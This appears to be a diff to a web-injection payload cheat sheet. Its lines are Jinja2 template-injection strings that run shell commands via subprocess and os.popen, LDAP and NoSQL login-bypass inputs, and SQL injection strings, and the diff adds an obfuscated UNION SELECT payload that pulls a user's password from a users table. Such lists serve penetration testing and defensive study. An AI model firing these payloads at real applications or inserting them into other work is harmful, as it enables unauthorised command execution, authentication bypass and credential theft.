@@ -29,6 +29,7 @@ Python - Jinja2
 {{"".class.mro[1].subclasses()[157].repr.globals.get("builtins").get("import")("subprocess").check_output(['cat', 'file.txt'])}}
 {{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("hostname")["read"]() }}
 
+
 LDAP
 LOGIN: x*        PASSWORD: *
 LOGIN: x*)(|(&    PASSWORD: pwd)
@@ -43,6 +44,7 @@ username=user123&password[$regex]=^a......$
 SQL
 ' OR 1=1--
 1' OR '1'='1
+'/**/uNion/**/sElect/**/1,2,password,4 FROM users WHERE username='alice'; --
 
 ORM
 1*
